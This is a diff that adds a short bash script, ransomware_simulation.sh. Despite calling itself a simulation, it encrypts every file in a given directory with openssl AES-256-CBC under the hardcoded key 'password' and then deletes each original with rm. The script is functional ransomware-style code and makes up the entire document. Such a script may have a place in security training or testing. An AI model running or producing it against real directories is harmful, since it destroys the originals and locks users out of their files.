@@ -1,0 +1,19 @@
+#!/bin/bash
+
+# Usage: ./ransomware_simulation.sh <directory>
+DIRECTORY=$1
+
+if [ -z "$DIRECTORY" ]; then
+    echo "Usage: $0 <directory>"
+    exit 1
+fi
+
+echo "Simulating ransomware attack on $DIRECTORY..."
+
+# Encrypt files using openssl
+for file in "$DIRECTORY"/*; do
+    openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -k "password"
+    rm "$file"
+done
+
+echo "Ransomware simulation completed."
